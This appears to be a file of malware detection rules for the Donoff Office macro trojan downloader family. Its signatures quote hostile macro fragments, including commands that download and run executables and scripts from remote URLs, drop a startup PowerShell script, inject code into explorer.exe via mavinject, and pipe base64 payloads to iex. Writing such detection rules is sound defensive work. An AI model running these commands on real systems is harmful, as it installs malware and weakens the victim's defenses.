
rule TrojanDownloader_O97M_Donoff_R_MTB{
	meta:
		description = "TrojanDownloader:O97M/Donoff.R!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 01 00 "
		
	strings :
		$a_01_0 = {43 61 6c 6c 20 53 68 65 6c 6c 28 22 63 6d 64 2e 65 78 65 20 20 2f 63 20 43 3a 5c 50 72 6f 67 72 61 6d 20 46 69 6c 65 73 5c 57 69 6e 64 6f 77 73 20 44 65 66 65 6e 64 65 72 5c 4d 70 43 6d 64 52 75 6e 2e 65 78 65 20 2d 44 6f 77 6e 6c 6f 61 64 46 69 6c 65 20 2d 75 72 6c 20 68 74 74 70 3a 2f 2f 30 2e 30 2e 30 2e 30 2f 61 73 2e 65 78 65 20 2d 70 61 74 68 20 43 3a 5c 25 74 65 6d 70 25 5c 61 73 2e 65 78 65 22 29 } //01 00  Call Shell("cmd.exe  /c C:\Program Files\Windows Defender\MpCmdRun.exe -DownloadFile -url http://0.0.0.0/as.exe -path C:\%temp%\as.exe")
		$a_01_1 = {57 73 68 65 6c 6c 2e 52 75 6e 20 43 68 72 28 33 34 29 20 26 20 22 76 69 72 75 73 2e 76 62 73 22 20 26 20 43 68 72 28 33 34 29 2c 20 30 } //00 00  Wshell.Run Chr(34) & "virus.vbs" & Chr(34), 0
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Donoff_R_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Donoff.R!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 04 00 00 02 00 "
		
	strings :
		$a_03_0 = {61 70 69 2e 69 70 69 66 79 2e 6f 72 67 2f 3f 66 6f 72 6d 61 74 3d 6a 73 6f 6e 90 0a 2f 00 68 74 74 70 73 3a 2f 2f 90 00 } //02 00 
		$a_01_1 = {20 3d 20 22 43 3a 5c 55 73 65 72 73 5c 22 20 26 20 41 70 70 6c 69 63 61 74 69 6f 6e 2e 55 73 65 72 4e 61 6d 65 20 26 20 22 5c 41 70 70 44 61 74 61 5c 52 6f 61 6d 69 6e 67 5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 53 74 61 72 74 20 4d 65 6e 75 5c 50 72 6f 67 72 61 6d 73 5c 53 74 61 72 74 75 70 5c 73 79 73 74 65 6d 2e 70 73 31 22 } //01 00   = "C:\Users\" & Application.UserName & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\system.ps1"
		$a_01_2 = {2e 45 78 65 63 28 22 63 61 6c 63 22 29 } //01 00  .Exec("calc")
		$a_01_3 = {22 42 61 73 65 36 34 44 65 63 6f 64 65 22 2c 20 22 42 61 64 20 63 68 61 72 61 63 74 65 72 20 49 6e 20 42 61 73 65 36 34 20 73 74 72 69 6e 67 2e 22 } //00 00  "Base64Decode", "Bad character In Base64 string."
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Donoff_R_MTB_3{
	meta:
		description = "TrojanDownloader:O97M/Donoff.R!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 01 00 "
		
	strings :
		$a_01_0 = {2e 52 75 6e 20 22 63 6d 64 20 2f 63 20 63 6f 70 79 20 2f 62 20 25 73 79 73 74 65 6d 72 6f 6f 74 25 5c 73 79 73 74 65 6d 33 32 5c 63 65 72 74 75 74 2a 2e 65 78 65 20 22 20 26 } //01 00  .Run "cmd /c copy /b %systemroot%\system32\certut*.exe " &
		$a_01_1 = {5c 44 72 69 76 65 72 47 46 58 43 6f 69 6e 2e 74 6d 70 22 } //01 00  \DriverGFXCoin.tmp"
		$a_01_2 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 22 77 69 6e 6d 67 6d 74 73 3a 5c 5c 2e 5c 72 6f 6f 74 5c 63 69 6d 76 32 22 29 } //01 00  = GetObject("winmgmts:\\.\root\cimv2")
		$a_01_3 = {2e 52 75 6e 20 22 63 6d 64 20 2f 63 20 6d 61 76 69 6e 6a 65 63 74 2e 65 78 65 20 22 20 26 20 6f 62 6a 49 74 65 6d 2e 50 72 6f 63 65 73 73 49 44 20 26 20 22 20 2f 69 6e 6a 65 63 74 72 75 6e 6e 69 6e 67 20 22 20 26 } //01 00  .Run "cmd /c mavinject.exe " & objItem.ProcessID & " /injectrunning " &
		$a_01_4 = {28 22 53 65 6c 65 63 74 20 2a 20 66 72 6f 6d 20 57 69 6e 33 32 5f 50 72 6f 63 65 73 73 20 77 68 65 72 65 20 6e 61 6d 65 3d 27 65 78 70 6c 6f 72 65 72 2e 65 78 65 27 22 29 } //00 00  ("Select * from Win32_Process where name='explorer.exe'")
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Donoff_R_MTB_4{
	meta:
		description = "TrojanDownloader:O97M/Donoff.R!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {62 41 42 42 41 45 67 41 5a 77 42 42 41 46 6f 41 55 51 42 42 41 47 34 41 51 51 42 44 41 45 45 41 51 51 42 4b 41 45 45 41 51 67 42 79 41 45 45 41 52 41 42 5a 41 45 45 41 54 67 42 33 41 45 49 41 5a 67 42 42 41 45 51 41 53 51 42 42 41 45 38 41 64 77 42 42 41 45 34 41 51 51 42 42 41 47 38 41 51 51 42 6d 41 46 45 41 51 67 42 71 41 45 45 41 52 77 42 46 41 45 45 41 5a 41 42 42 41 45 49 41 61 67 42 42 41 45 63 41 5a 77 42 42 41 47 55 41 64 77 42 43 41 44 6b 41 51 51 42 42 41 44 30 41 50 51 41 69 41 43 6b 41 4b 51 42 38 41 47 6b 41 5a 51 42 34 41 41 3d 3d } //01 00  bABBAEgAZwBBAFoAUQBBAG4AQQBDAEEAQQBKAEEAQgByAEEARABZAEEATgB3AEIAZgBBAEQASQBBAE8AdwBBAE4AQQBBAG8AQQBmAFEAQgBqAEEARwBFAEEAZABBAEIAagBBAEcAZwBBAGUAdwBCADkAQQBBAD0APQAiACkAKQB8AGkAZQB4AA==
		$a_01_1 = {61 67 42 42 41 45 67 41 51 51 42 42 41 46 63 41 5a 77 42 43 41 46 59 41 51 51 42 48 41 46 6b 41 51 51 42 56 41 48 63 41 51 67 42 6f 41 45 45 41 52 67 42 42 41 45 45 41 56 67 42 42 41 45 49 41 55 41 42 42 41 45 63 41 63 77 42 42 41 47 45 41 64 77 42 42 41 44 63 41 51 51 42 42 41 44 41 41 51 51 42 44 41 47 63 41 51 51 42 4f 41 45 45 41 51 51 42 76 41 45 45 41 5a 67 42 52 41 45 45 41 54 67 42 42 41 45 45 41 62 77 42 42 41 46 6b 41 64 77 42 43 41 47 67 41 51 51 42 49 41 46 45 41 51 51 42 5a 41 48 63 41 51 67 42 76 41 45 45 41 53 41 42 7a 41 45 45 41 5a 67 42 52 41 45 45 41 50 51 41 69 41 43 6b 41 4b 51 42 38 41 47 6b 41 5a 51 42 59 41 41 3d 3d } //01 00  agBBAEgAQQBBAFcAZwBCAFYAQQBHAFkAQQBVAHcAQgBoAEEARgBBAEEAVgBBAEIAUABBAEcAcwBBAGEAdwBBADcAQQBBADAAQQBDAGcAQQBOAEEAQQBvAEEAZgBRAEEATgBBAEEAbwBBAFkAdwBCAGgAQQBIAFEAQQBZAHcAQgBvAEEASABzAEEAZgBRAEEAPQAiACkAKQB8AGkAZQBYAA==
		$a_01_2 = {2e 52 75 6e 28 } //01 00  .Run(
		$a_01_3 = {20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 } //00 00   = CreateObject(
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Donoff_R_MTB_5{
	meta:
		description = "TrojanDownloader:O97M/Donoff.R!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 03 00 00 01 00 "
		
	strings :
		$a_03_0 = {53 75 62 20 44 6f 77 6e 6c 6f 61 64 46 69 6c 65 57 69 74 68 55 52 4c 6c 69 6e 6b 28 29 0d 0a 90 02 0f 27 55 52 4c 6c 69 6e 6b 2c 20 46 69 6c 65 6e 61 6d 65 0d 0a 90 02 0f 64 6f 77 6e 6c 6f 61 64 66 69 6c 65 20 77 77 77 2e 67 6f 6f 67 6c 65 2e 63 6f 6d 2f 90 02 07 2d 90 02 07 2d 90 02 07 2e 64 6f 63 78 2c 20 22 77 6f 72 64 66 69 6c 65 6e 61 6d 65 2e 64 6f 63 78 22 0d 0a 45 6e 64 20 53 75 62 90 00 } //01 00 
		$a_01_1 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 73 69 6e 44 6f 63 22 0d 0a 53 75 62 20 67 65 6e 49 28 29 0d 0a 4f 70 65 6e 20 22 76 62 49 6e 69 74 52 65 6d 6f 76 65 2e 68 74 61 22 20 26 20 6f 50 6f 69 6e 74 65 72 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31 0d 0a 50 72 69 6e 74 20 23 31 2c 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 52 61 6e 67 65 2e 54 65 78 74 0d 0a 43 6c 6f 73 65 20 23 31 } //01 00 
		$a_01_2 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 61 72 72 61 79 42 42 6f 72 64 65 72 22 0d 0a 53 75 62 20 69 6e 69 74 56 62 61 28 29 0d 0a 4f 70 65 6e 20 22 64 6f 63 42 6f 72 64 65 72 57 69 6e 2e 68 74 61 22 20 26 20 62 75 74 74 54 65 6d 70 6c 61 74 65 48 65 61 64 65 72 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31 0d 0a 50 72 69 6e 74 20 23 31 2c 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 52 61 6e 67 65 2e 54 65 78 74 0d 0a 43 6c 6f 73 65 20 23 31 0d 0a 45 6e 64 20 53 75 62 } //00 00 
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Donoff_R_MTB_6{
	meta:
		description = "TrojanDownloader:O97M/Donoff.R!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 06 00 06 00 00 01 00 "
		
	strings :
		$a_01_0 = {47 65 74 43 53 56 20 22 68 74 74 70 73 3a 2f 2f 77 77 77 2e 63 6a 6f 69 6e 74 2e 63 6f 6d 2f 64 6f 63 2f 32 31 5f 30 35 2f 4b 45 43 72 67 78 7a 62 4f 38 33 5f 70 72 6f 74 65 63 74 2e 63 6d 64 22 2c 20 22 43 3a 5c 74 6f 74 6f 5c 70 72 6f 74 65 63 74 2e 63 6d 64 22 } //01 00  GetCSV "https://www.cjoint.com/doc/21_05/KECrgxzbO83_protect.cmd", "C:\toto\protect.cmd"
		$a_01_1 = {47 65 74 43 53 56 20 22 68 74 74 70 73 3a 2f 2f 77 77 77 2e 63 6a 6f 69 6e 74 2e 63 6f 6d 2f 64 6f 63 2f 32 31 5f 30 35 2f 4b 45 43 72 67 78 7a 62 4f 38 33 5f 70 72 6f 74 65 63 74 2e 63 6d 64 22 2c 20 22 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 70 72 6f 74 65 63 74 2e 63 6d 64 22 } //01 00  GetCSV "https://www.cjoint.com/doc/21_05/KECrgxzbO83_protect.cmd", "C:\ProgramData\protect.cmd"
		$a_01_2 = {47 65 74 43 53 56 20 22 68 74 74 70 73 3a 2f 2f 77 77 77 2e 63 6a 6f 69 6e 74 2e 63 6f 6d 2f 64 6f 63 2f 32 31 5f 30 35 2f 4b 45 43 71 55 47 50 6d 57 46 33 5f 78 6d 6c 65 2e 62 61 74 22 2c 20 22 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 78 6d 6c 65 2e 62 61 74 22 } //01 00  GetCSV "https://www.cjoint.com/doc/21_05/KECqUGPmWF3_xmle.bat", "C:\ProgramData\xmle.bat"
		$a_01_3 = {47 65 74 43 53 56 20 22 68 74 74 70 73 3a 2f 2f 77 77 77 2e 63 6a 6f 69 6e 74 2e 63 6f 6d 2f 64 6f 63 2f 32 31 5f 30 35 2f 4b 45 43 71 47 5a 73 63 38 38 33 5f 64 43 6f 6e 74 72 6f 6c 2e 6f 75 69 22 2c 20 22 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 64 43 6f 6e 74 72 6f 6c 2e 65 78 65 22 } //01 00  GetCSV "https://www.cjoint.com/doc/21_05/KECqGZsc883_dControl.oui", "C:\ProgramData\dControl.exe"
		$a_01_4 = {47 65 74 43 53 56 20 22 68 74 74 70 73 3a 2f 2f 77 77 77 2e 63 6a 6f 69 6e 74 2e 63 6f 6d 2f 64 6f 63 2f 32 31 5f 30 35 2f 4b 45 43 6e 67 55 37 79 56 57 33 5f 52 75 6e 4e 48 69 64 65 2e 6f 75 69 22 2c 20 22 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 52 75 6e 4e 48 69 64 65 2e 65 78 65 22 } //01 00  GetCSV "https://www.cjoint.com/doc/21_05/KECngU7yVW3_RunNHide.oui", "C:\ProgramData\RunNHide.exe"
		$a_01_5 = {47 65 74 43 53 56 20 22 68 74 74 70 73 3a 2f 2f 77 77 77 2e 63 6a 6f 69 6e 74 2e 63 6f 6d 2f 64 6f 63 2f 32 31 5f 30 35 2f 4b 45 46 75 6a 74 69 69 32 7a 68 5f 75 7a 32 2e 76 62 73 22 2c 20 22 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 75 7a 32 2e 76 62 73 22 } //00 00  GetCSV "https://www.cjoint.com/doc/21_05/KEFujtii2zh_uz2.vbs", "C:\ProgramData\uz2.vbs"
	condition:
		any of ($a_*)
 
}